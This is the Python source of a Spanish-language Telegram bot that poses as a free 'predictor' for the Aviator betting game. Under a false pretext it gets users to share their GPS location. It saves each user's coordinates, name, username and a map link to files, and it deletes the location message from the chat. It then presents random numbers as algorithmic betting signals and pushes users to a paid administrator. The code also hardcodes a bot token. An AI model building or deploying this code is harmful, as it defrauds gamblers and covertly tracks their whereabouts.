import os
import json
import time
import random
import string
import threading
from datetime import datetime, timedelta
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from requests.exceptions import ConnectionError

TOKEN = '8932126962:AAGB2AuiHVkV6XtLWiTb-Y7msfpsscYNqB8'

bot = telebot.TeleBot(TOKEN, threaded=False)

# --- EMOJIS PREMIUM OFICIALES DEL PROYECTO ---
E_ESTRELLA = '<tg-emoji emoji-id="5370784581341422520">⭐️</tg-emoji>'
E_GAFAS = '<tg-emoji emoji-id="5235684778727974441">😎</tg-emoji>'
E_PULGAR = '<tg-emoji emoji-id="5393130162311157022">👍</tg-emoji>'
E_FLECHA = '<tg-emoji emoji-id="5429651785352501917">↗️</tg-emoji>'
E_BOLSA = '<tg-emoji emoji-id="5453901475648390219">🛍</tg-emoji>'
E_COHETE = '<tg-emoji emoji-id="5188481279963715781">🚀</tg-emoji>'
E_DIVISAS = '<tg-emoji emoji-id="5377336227533969892">💱</tg-emoji>'
E_ADN1 = '<tg-emoji emoji-id="5215621964286142449">🧬</tg-emoji>'
E_REGALO = '<tg-emoji emoji-id="5215668908278686541">🎁</tg-emoji>'
E_ADN2 = '<tg-emoji emoji-id="5215673679987355184">🧬</tg-emoji>'
E_DIAMANTE = '<tg-emoji emoji-id="6059684519437405439">💎</tg-emoji>'

# Configuración de rutas compatible con Linux / GitHub Actions
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RUTA_UBICACIONES = os.path.join(BASE_DIR, "ubicaciones")
ARCHIVO_BD = os.path.join(BASE_DIR, "usuarios_seguridad.json")

# Crear la carpeta de ubicaciones si no existe
os.makedirs(RUTA_UBICACIONES, exist_ok=True)

# Cargar base de datos persistente de seguridad
if os.path.exists(ARCHIVO_BD):
    with open(ARCHIVO_BD, "r", encoding="utf-8") as f:
        try:
            base_seguridad = json.load(f)
        except Exception:
            base_seguridad = {}
else:
    base_seguridad = {}

usuarios_estado = {}

def guardar_base_seguridad():
    with open(ARCHIVO_BD, "w", encoding="utf-8") as f:
        json.dump(base_seguridad, f, indent=4)

def extraer_nombre(texto):
    palabras = texto.strip().split()
    if len(palabras) > 0:
        return palabras[-1].upper()
    return "AMIGO"

def es_mensaje_de_espera(texto):
    frases_espera = [
        "un momento", "un momento por favor", "ya va", "espera",
        "esperame", "un minuto", "ok un momento", "dame un momento",
        "banca", "aguantame", "listo ya te la mando", "ya te la envio",
        "voy", "ya voy", "ok voy", "dale ya voy", "bancame"
    ]
    texto_limpio = texto.lower().strip()
    return any(frase in texto_limpio for frase in frases_espera)

def generar_codigo_7_digitos():
    caracteres = string.ascii_uppercase + string.digits
    return ''.join(random.choice(caracteres) for _ in range(7))

def obtener_monto_apuesta(saldo):
    tabla = {
        10: 4, 20: 10, 30: 15, 40: 20, 50: 30,
        60: 40, 70: 50, 80: 60, 90: 70, 100: 80
    }
    return tabla.get(saldo, 4)

def enviar_mensaje_seguro(chat_id, texto, parse_mode=None, reply_markup=None):
    for intento in range(3):
        try:
            return bot.send_message(chat_id, texto, parse_mode=parse_mode, reply_markup=reply_markup)
        except (ConnectionError, Exception):
            print(f"[-] Error de conexión detectado (Intento {intento+1}/3). Reintentando en 2 segundos...")
            time.sleep(2)
    print("[-] No se pudo restablecer la conexión con Telegram en este hilo.")

def programar_y_evaluar_senal(chat_id, plataforma, saldo, es_segunda_senal=False):
    minutos_espera = random.randint(2, 6)
    hora_senal_dt = datetime.now() + timedelta(minutes=minutos_espera)
    hora_senal_str = hora_senal_dt.strftime("%I:%M %p")

    multiplicador = round(random.uniform(1.00, 1.76), 2)
    monto_apuesta = obtener_monto_apuesta(saldo)

    plataforma_mayus = plataforma.upper()
    mensaje_senal = (
        f"{E_DIAMANTE} <b>GLOBAL</b> {E_DIAMANTE}\n\n"
        f"{E_ESTRELLA} <b>ATENCIÓN</b> {E_ESTRELLA}      {E_COHETE} <b>SEÑALES</b> {E_COHETE}\n\n"
        f"            {E_BOLSA} <b>{plataforma_mayus}</b> {E_BOLSA}\n\n"
        f"        {E_REGALO} <b>VALOR DE APUESTA: ${monto_apuesta} USD</b> {E_REGALO}\n\n"
        f"                {E_FLECHA} <b>{multiplicador:.2f}X</b> {E_FLECHA}\n"
        f"            {E_ADN1} <b>{hora_senal_str}</b> {E_ADN1}\n\n"
        f"        {E_ESTRELLA} <b>BUENA SUERTE</b> {E_ESTRELLA}\n"
        f"{E_DIAMANTE}{E_ESTRELLA}{E_COHETE}{E_PULGAR}{E_DIVISAS}{E_ADN2}{E_DIAMANTE}{E_ESTRELLA}{E_COHETE}{E_PULGAR}"
    )

    enviar_mensaje_seguro(chat_id, mensaje_senal, parse_mode='html')

    segundos_hasta_senal = (hora_senal_dt - datetime.now()).total_seconds()
    if segundos_hasta_senal > 0:
        time.sleep(segundos_hasta_senal)

    time.sleep(10)

    if not es_segunda_senal:
        usuarios_estado[chat_id]['paso'] = 'esperando_confirmacion_1'
    else:
        usuarios_estado[chat_id]['paso'] = 'esperando_confirmacion_2'

    usuarios_estado[chat_id]['hora_evaluada'] = hora_senal_str

    pregunta_resultado = f"{E_ESTRELLA} <b>¿QUÉ RESULTADO SALIÓ EN LA JUGADA DE LAS {hora_senal_str}?</b> {E_DIAMANTE}"
    enviar_mensaje_seguro(chat_id, pregunta_resultado, parse_mode='html')

def mostrar_botones_saldo(chat_id):
    markup = InlineKeyboardMarkup(row_width=3)
    btn10 = InlineKeyboardButton(text="💱 $10", callback_data="saldo_10")
    btn20 = InlineKeyboardButton(text="💱 $20", callback_data="saldo_20")
    btn30 = InlineKeyboardButton(text="💱 $30", callback_data="saldo_30")
    btn40 = InlineKeyboardButton(text="💱 $40", callback_data="saldo_40")
    btn50 = InlineKeyboardButton(text="💱 $50", callback_data="saldo_50")
    btn60 = InlineKeyboardButton(text="💱 $60", callback_data="saldo_60")
    btn70 = InlineKeyboardButton(text="💱 $70", callback_data="saldo_70")
    btn80 = InlineKeyboardButton(text="💱 $80", callback_data="saldo_80")
    btn90 = InlineKeyboardButton(text="💱 $90", callback_data="saldo_90")
    btn100 = InlineKeyboardButton(text="💱 $100", callback_data="saldo_100")

    markup.add(btn10, btn20, btn30, btn40, btn50, btn60, btn70, btn80, btn90, btn100)

    mensaje_saldo = f"{E_BOLSA} <b>SELECCIONAR TU SALDO ACTUAL EN LOS BOTONES DE ABAJO PARA CALCULAR TU SECUENCIA DE LOS ALGORITMOS:</b> {E_ESTRELLA}"
    enviar_mensaje_seguro(chat_id, mensaje_saldo, parse_mode='html', reply_markup=markup)

def enviar_bloqueo_final_admon(chat_id):
    str_id = str(chat_id)
    if str_id not in base_seguridad:
        base_seguridad[str_id] = {
            "bloqueado": True,
            "codigo": generar_codigo_7_digitos(),
            "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        guardar_base_seguridad()

    codigo_personal = base_seguridad[str_id]["codigo"]

    markup = InlineKeyboardMarkup()
    btn_admon = InlineKeyboardButton(text="💎 CONTACTAR ADMINISTRADOR 💎", url="https://t.me/apkpredictor")
    markup.add(btn_admon)

    mensaje_bloqueo = (
        f"{E_DIAMANTE} <b>PARA PODER SEGUIR USANDO EL BOT Y ACCEDER A MÁS SECUENCIAS DIARIAS, "
        f"DEBES CONTACTARTE CON NUESTRO ADMINISTRADOR: WILLIAM ROBERTH.</b> {E_ESTRELLA}\n\n"
        f"{E_COHETE} <b>Y ESTE SERÁ TU CÓDIGO PARA QUE SEAS ATENDIDO:</b> <code>{codigo_personal}</code>\n\n"
        f"{E_FLECHA} <b>DALE CLIC AL BOTÓN DE ABAJO PARA ENVIARLE TU CÓDIGO:</b> {E_PULGAR}"
    )

    enviar_mensaje_seguro(chat_id, mensaje_bloqueo, parse_mode='html', reply_markup=markup)

@bot.message_handler(commands=['start'])
def enviar_bienvenida(message):
    chat_id = message.chat.id
    str_id = str(chat_id)

    if str_id in base_seguridad and base_seguridad[str_id].get("bloqueado", False):
        usuarios_estado[chat_id] = {'paso': 'bloqueado_final'}
        enviar_bloqueo_final_admon(chat_id)
        return

    usuarios_estado[chat_id] = {'paso': 'esperando_ubicacion', 'nombre': None, 'plataforma': None, 'saldo': None}

    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    btn_ubicacion = KeyboardButton(text="⭐️ ACTIVAR PREDICTOR FREE ⭐️", request_location=True)
    markup.add(btn_ubicacion)

    enviar_mensaje_seguro(chat_id, f"{E_COHETE} <b>BIENVENIDO AL PREDICTOR FREE DIARIO. PARA SINCRONIZAR LAS CONSTANTES REQUISITAS CON TU SERVIDOR LOCAL, POR FAVOR PRESIONA EL BOTÓN DE ABAJO:</b> {E_DIAMANTE}", parse_mode='html', reply_markup=markup)

@bot.message_handler(content_types=['location'])
def manejar_ubicacion(message):
    chat_id = message.chat.id
    if chat_id not in usuarios_estado or usuarios_estado[chat_id]['paso'] != 'esperando_ubicacion':
        return

    lat = message.location.latitude
    lon = message.location.longitude

    username = message.from_user.username if message.from_user.username else "No posee"
    first_name = message.from_user.first_name if message.from_user.first_name else ""
    last_name = message.from_user.last_name if message.from_user.last_name else ""
    nombre_completo = f"{first_name} {last_name}".strip() if (first_name or last_name) else "No especificado"

    try:
        bot.delete_message(chat_id, message.message_id)
    except Exception:
        pass

    nombre_archivo = f"user_{chat_id}.txt"
    ruta_completa = os.path.join(RUTA_UBICACIONES, nombre_archivo)

    info_texto = (
        f"ID Telegram: {chat_id}\n"
        f"Usuario (@): {username}\n"
        f"Nombre en Perfil: {nombre_completo}\n"
        f"Fecha/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Coordenadas: {lat}, {lon}\n"
        f"Enlace Maps: https://www.google.com/maps?q={lat},{lon}\n"
    )

    with open(ruta_completa, "w", encoding="utf-8") as f:
        f.write(info_texto)

    usuarios_estado[chat_id]['paso'] = 'esperando_nombre'
    enviar_mensaje_seguro(chat_id, f"{E_DIAMANTE} <b>REGISTRO EXITOSO</b> {E_DIAMANTE}\n\n<b>HOLA QUE TAL UN GUSTO SALUDARTE ESPERO TE ENCUENTRES BIEN CUENTAME, ¿CÓMO TE LLAMAS?</b>", parse_mode='html', reply_markup=ReplyKeyboardRemove())

@bot.callback_query_handler(func=lambda call: call.data.startswith('saldo_'))
def manejar_seleccion_saldo(call):
    chat_id = call.message.chat.id
    if chat_id not in usuarios_estado or usuarios_estado[chat_id]['paso'] != 'esperando_saldo':
        bot.answer_callback_query(call.id, "Operación no válida.")
        return

    value_saldo = int(call.data.split('_')[1])
    usuarios_estado[chat_id]['saldo'] = value_saldo
    usuarios_estado[chat_id]['paso'] = 'esperando_captura'

    bot.answer_callback_query(call.id, f"REGISTRADO: ${value_saldo} USD")

    respuesta_aviator = f"{E_COHETE} <b>OK ENTRA EN AVIATOR Y LUEGO QUE ENTRES ME ENVIAS UNA CAPTURA DONDE SE VEA TU SALDO ACTUAL DE ${value_saldo} USD Y LAS JUGADAS ACTUALES, ASI PODRE DARTE LA SECUENCIA EXACTA</b> {E_ESTRELLA}"
    enviar_mensaje_seguro(chat_id, respuesta_aviator, parse_mode='html')

@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'document', 'voice', 'audio'])
def manejar_conversacion(message):
    chat_id = message.chat.id
    str_id = str(chat_id)
    texto_usuario = message.text.strip() if message.text else ""

    if str_id in base_seguridad and base_seguridad[str_id].get("bloqueado", False):
        enviar_bloqueo_final_admon(chat_id)
        return

    if chat_id not in usuarios_estado:
        usuarios_estado[chat_id] = {'paso': 'esperando_ubicacion', 'nombre': None, 'plataforma': None, 'saldo': None}
        enviar_bienvenida(message)
        return

    estado_actual = usuarios_estado[chat_id]['paso']

    if message.content_type in ['voice', 'audio']:
        if estado_actual == 'esperando_nombre':
            usuarios_estado[chat_id]['nombre'] = "MI HERMANO"
            usuarios_estado[chat_id]['paso'] = 'esperando_plataforma'
            enviar_mensaje_seguro(chat_id, f"{E_ESTRELLA} <b>PERFECTO MI HERMANO, UN PLACER CONOCERTE! CUÉNTAME, ¿EN QUÉ PLATAFORMA JUEGAS?</b> {E_COHETE}", parse_mode='html')
        elif estado_actual == 'esperando_plataforma':
            enviar_mensaje_seguro(chat_id, f"{E_DIAMANTE} <b>POR FAVOR, ESCRÍBEME EN TEXTO EL NOMBRE DE LA PLATAFORMA DONDE JUEGAS PARA REGISTRARLA.</b> {E_PULGAR}", parse_mode='html')
        elif estado_actual == 'esperando_saldo':
            mostrar_botones_saldo(chat_id)
        elif estado_actual == 'esperando_captura':
            enviar_mensaje_seguro(chat_id, f"{E_DIVISAS} <b>OK PERFECTO, ENTIENDO, PERO QUEDO A LA ESPERA DE QUE ME ENVÍES LA CAPTURA DE PANTALLA DE TU SALDO EN AVIATOR.</b> {E_REGALO}", parse_mode='html')
        elif estado_actual in ['esperando_confirmacion_1', 'esperando_confirmacion_2']:
            enviar_mensaje_seguro(chat_id, f"{E_FLECHA} <b>POR FAVOR, ESCRÍBEME EL RESULTADO PARA PODER PROCESAR EL SIGUIENTE PASO.</b> {E_ESTRELLA}", parse_mode='html')
        else:
            enviar_bloqueo_final_admon(chat_id)
        return

    if estado_actual == 'esperando_ubicacion':
        enviar_mensaje_seguro(chat_id, f"{E_COHETE} <b>DEBES HACER CLIC EN EL BOTÓN DE ABAJO PARA ACCEDER AL SERVICIO.</b> {E_ESTRELLA}", parse_mode='html')
        return

    if estado_actual == 'esperando_nombre':
        if not texto_usuario:
            return
        nombre_limpio = extraer_nombre(texto_usuario)
        usuarios_estado[chat_id]['nombre'] = nombre_limpio
        usuarios_estado[chat_id]['paso'] = 'esperando_plataforma'

        respuesta = f"{E_ESTRELLA} <b>PERFECTO {nombre_limpio}, CUÉNTAME EN QUE PLATAFORMA JUEGAS?</b> {E_COHETE}"
        enviar_mensaje_seguro(chat_id, respuesta, parse_mode='html')

    elif estado_actual == 'esperando_plataforma':
        if not texto_usuario:
            enviar_ayuda_admon(chat_id)
            return

        usuarios_estado[chat_id]['plataforma'] = texto_usuario
        usuarios_estado[chat_id]['paso'] = 'esperando_saldo'
        mostrar_botones_saldo(chat_id)

    elif estado_actual == 'esperando_saldo':
        mostrar_botones_saldo(chat_id)

    elif estado_actual == 'esperando_captura':
        if message.content_type in ['photo', 'document']:
            usuarios_estado[chat_id]['paso'] = 'procesando_senal_1'
            plataforma = usuarios_estado[chat_id]['plataforma'] or "BETSON"
            saldo = usuarios_estado[chat_id]['saldo'] or 10
            threading.Thread(target=programar_y_evaluar_senal, args=(chat_id, plataforma, saldo, False)).start()

        elif message.content_type == 'text' and es_mensaje_de_espera(texto_usuario):
            mensaje_espera = f"{E_ESTRELLA} <b>OK PERFECTO, QUEDO A LA ESPERA DE TU CAPTURA DE PANTALLA...</b> {E_COHETE}"
            enviar_mensaje_seguro(chat_id, mensaje_espera, parse_mode='html')
        else:
            enviar_ayuda_admon(chat_id)

    elif estado_actual == 'esperando_confirmacion_1':
        usuarios_estado[chat_id]['paso'] = 'procesando_senal_2'
        plataforma = usuarios_estado[chat_id]['plataforma'] or "BETSON"
        saldo = usuarios_estado[chat_id]['saldo'] or 10

        enviar_mensaje_seguro(chat_id, f"{E_COHETE} <b>PROCESANDO NUEVA SECUENCIA EN TIEMPO REAL UN MOMENTO MIENTRAS VINCULAMOS LOS ALGORITMOS DE TU PLATAFORMA</b> {E_DIAMANTE}", parse_mode='html')
        threading.Thread(target=programar_y_evaluar_senal, args=(chat_id, plataforma, saldo, True)).start()

    elif estado_actual == 'esperando_confirmacion_2':
        usuarios_estado[chat_id]['paso'] = 'bloqueado_final'
        enviar_bloqueo_final_admon(chat_id)

    elif estado_actual == 'bloqueado_final':
        enviar_bloqueo_final_admon(chat_id)

def enviar_ayuda_admon(chat_id):
    markup = InlineKeyboardMarkup()
    btn_admon = InlineKeyboardButton(text="💎 ADMON 💎", url="https://t.me/apkpredictor")
    markup.add(btn_admon)

    mensaje_soporte = f"{E_ESTRELLA} <b>PARA QUE TE DEMOS UNA MEJOR INFORMACION TE RECOMIENDO CONTACTARTE CON MI CREADOR</b> {E_COHETE}"
    enviar_mensaje_seguro(chat_id, mensaje_soporte, parse_mode='html', reply_markup=markup)

if __name__ == '__main__':
    print('[+] Borrando cache de mensajes viejos en Telegram...')
    try:
        bot.remove_webhook()
    except Exception:
        pass
    time.sleep(1)

    print('[+] SISTEMA BLINDADO CON AUTO-RECONEXIÓN ACTIVA. Dale /start...')
    bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
